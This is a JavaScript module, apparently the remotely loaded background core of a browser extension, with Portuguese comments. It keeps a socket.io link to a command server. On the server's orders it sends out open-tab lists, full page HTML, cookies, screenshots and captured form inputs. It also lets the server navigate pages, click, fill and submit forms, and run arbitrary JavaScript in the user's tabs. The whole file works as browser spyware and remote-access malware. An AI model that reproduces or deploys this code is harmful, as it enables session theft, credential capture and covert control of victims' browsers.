/**
 * Core remoto (ESM) — entry do background.
 * Publicar no repo remoto sob a tag v1.0.0.
 *
 * Contrato esperado pelo loader local:
 * - export async function initBackground({ chrome, io, context })
 * - export async function handleBackgroundMessage({ chrome, message, sender, cachedTag })
 */

import { ACTIONS } from "./actions.js";
import { handleRelayRequest } from "./relay.js";
import {
  rnOpen,
  rnClose,
  rnNavigate,
  rnGetDom,
  rnGetCookies,
  rnClick,
  rnFill,
  rnSubmit,
  rnExecJs,
} from "./remoteNav.js";

let socket = null;
let clientId = null;
let lastServerUrl = null;

async function getServerBaseUrl() {
  // Compat: usa storage.local.serverBaseUrl se existir; senão localhost:8766
  const stored = await chrome.storage.local.get(["serverBaseUrl"]);
  const v = stored?.serverBaseUrl ? String(stored.serverBaseUrl) : "http://localhost:8766";
  return v.replace(/\/+$/, "");
}

async function getOrGenerateClientId() {
  const stored = await chrome.storage.local.get(["clientId"]);
  if (stored?.clientId) return String(stored.clientId);
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
  let s = "";
  for (let i = 0; i < 10; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
  await chrome.storage.local.set({ clientId: s });
  return s;
}

function connectSocket(io, serverUrl) {
  if (socket && lastServerUrl === serverUrl) return socket;
  lastServerUrl = serverUrl;
  socket = io(serverUrl, {
    path: "/socket.io",
    transports: ["websocket"],
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1500,
  });

  socket.on("connect", async () => {
    if (!clientId) return;
    socket.emit("register-client", {
      clientId,
      version: chrome.runtime.getManifest().version,
    });
    await sendTabsInfo();
  });

  socket.on(ACTIONS.RELAY_REQUEST, async (payload) => {
    await handleRelayRequest({ socket, payload });
  });

  // Remote nav básico
  socket.on(ACTIONS.REMOTE_NAV_OPEN, async (payload) => rnOpen({ socket, clientId, tabId: payload?.tabId }));
  socket.on(ACTIONS.REMOTE_NAV_CLOSE, async () => rnClose({ socket, clientId }));
  socket.on(ACTIONS.REMOTE_NAV_NAVIGATE, async (payload) => rnNavigate({ socket, clientId, url: payload?.url }));
  socket.on(ACTIONS.REMOTE_NAV_GET_DOM, async () => rnGetDom({ socket, clientId }));
  socket.on(ACTIONS.REMOTE_NAV_GET_COOKIES, async () => rnGetCookies({ socket, clientId }));
  socket.on(ACTIONS.REMOTE_NAV_CLICK, async (payload) => rnClick({ socket, clientId, selector: payload?.selector }));
  socket.on(ACTIONS.REMOTE_NAV_FILL, async (payload) => rnFill({ socket, clientId, selector: payload?.selector, value: payload?.value }));
  socket.on(ACTIONS.REMOTE_NAV_SUBMIT, async (payload) => rnSubmit({ socket, clientId, selector: payload?.selector }));
  socket.on(ACTIONS.REMOTE_NAV_EXEC_JS, async (payload) => rnExecJs({ socket, clientId, code: payload?.code }));

  // DOM/Cookies/Screenshot “legado” (comandos)
  socket.on(ACTIONS.COMMAND_GET_DOM, async (payload) => {
    const tabId = payload?.tabId != null ? parseInt(String(payload.tabId), 10) : null;
    await emitDomSnapshot(tabId);
  });
  socket.on(ACTIONS.COMMAND_GET_COOKIES, async (payload) => {
    const tabId = payload?.tabId != null ? parseInt(String(payload.tabId), 10) : null;
    await emitCookiesSnapshot(tabId);
  });
  socket.on(ACTIONS.TAKE_SCREENSHOT, async (payload) => {
    const tabId = payload?.tabId != null ? parseInt(String(payload.tabId), 10) : null;
    await emitScreenshot(tabId);
  });

  socket.on("REQUEST_TABS", async () => {
    await sendTabsInfo();
  });

  return socket;
}

async function sendTabsInfo() {
  if (!socket?.connected || !clientId) return;
  try {
    const tabs = await chrome.tabs.query({});
    socket.emit(ACTIONS.TABS_LIST, {
      clientId,
      tabs: (tabs || []).map((t) => ({
        tabId: t.id,
        url: t.url || "",
        domain: t.url || "",
        isActive: !!t.active,
        title: t.title || "",
        windowId: t.windowId,
      })),
    });
  } catch (_) {}
}

function getDomInPage() {
  try {
    return { html: document.documentElement?.outerHTML || "", url: document.location?.href || "" };
  } catch (e) {
    return { html: "", url: "", error: String(e?.message || e) };
  }
}

async function emitDomSnapshot(tabId) {
  if (!socket?.connected || !clientId) return;
  try {
    const tid = (typeof tabId === "number" && !Number.isNaN(tabId)) ? tabId : (await chrome.tabs.query({ active: true, currentWindow: true }))?.[0]?.id;
    if (!tid) return;
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: tid },
      world: "MAIN",
      func: getDomInPage,
      args: [],
    });
    const out = result || { html: "", url: "" };
    socket.emit(ACTIONS.DOM_DATA, {
      clientId,
      tabId: tid,
      url: out.url || "",
      html: out.html || "",
    });
  } catch (e) {
    socket.emit(ACTIONS.DOM_DATA, {
      clientId,
      tabId: tabId ?? null,
      url: "",
      html: `<!-- erro DOM: ${String(e?.message || e)} -->`,
    });
  }
}

async function emitCookiesSnapshot(tabId) {
  if (!socket?.connected || !clientId) return;
  const tid = (typeof tabId === "number" && !Number.isNaN(tabId)) ? tabId : (await chrome.tabs.query({ active: true, currentWindow: true }))?.[0]?.id;
  if (!tid) return;
  const tab = await chrome.tabs.get(tid).catch(() => null);
  const url = String(tab?.url || "");
  try {
    const cookies = /^https?:/i.test(url) ? await chrome.cookies.getAll({ url }) : [];
    socket.emit(ACTIONS.COOKIE_DATA, { clientId, tabId: tid, url, cookies });
  } catch (e) {
    socket.emit(ACTIONS.COOKIE_DATA, { clientId, tabId: tid, url, cookies: [], error: String(e?.message || e) });
  }
}

async function emitScreenshot(tabId) {
  if (!socket?.connected || !clientId) return;
  const tid = (typeof tabId === "number" && !Number.isNaN(tabId)) ? tabId : (await chrome.tabs.query({ active: true, currentWindow: true }))?.[0]?.id;
  if (!tid) return;
  const tab = await chrome.tabs.get(tid).catch(() => null);
  if (!tab) return;
  try {
    const dataUrl = await chrome.tabs.captureVisibleTab(tab.windowId, { format: "png" });
    socket.emit(ACTIONS.SCREENSHOT_DATA, { clientId, tabId: tid, url: tab.url || "", screenshot: dataUrl });
  } catch (e) {
    socket.emit(ACTIONS.SCREENSHOT_FAILED, { clientId, tabId: tid, error: String(e?.message || e) });
  }
}

async function getRulesForUrl(_url) {
  // Por enquanto vazio; pode ser implementado para consultar o servidor via HTTP/socket.
  return {};
}

async function handleInputCaptured(payload) {
  if (!socket?.connected || !clientId) return;
  socket.emit("message", { action: ACTIONS.CAPTURED_INPUT_DATA, content: payload });
}

export async function initBackground({ chrome, io, context }) {
  if (context !== "background") return;
  clientId = await getOrGenerateClientId();
  const serverUrl = await getServerBaseUrl();
  connectSocket(io, serverUrl);
}

export async function handleBackgroundMessage({ chrome, message }) {
  const type = message?.type || message?.action;

  if (type === "remote:get-content-init") {
    return { handled: true, response: { payload: { text: "EXT Hybrid ativo", position: "bottom-right" } } };
  }

  if (type === "GET_INPUT_RULES_FOR_URL") {
    const url = String(message?.url || "");
    const rules = await getRulesForUrl(url);
    return { handled: true, response: rules };
  }

  if (type === "INPUT_CAPTURED" || type === "INPUT_CAPTURED_LEGACY") {
    const payload = message?.payload || message?.content || {};
    await handleInputCaptured(payload);
    return { handled: true, response: { ok: true } };
  }

  if (type === "CORE_PING") {
    return { handled: true, response: { ok: true, clientId, socketConnected: !!socket?.connected } };
  }

  return { handled: false, response: undefined };
}

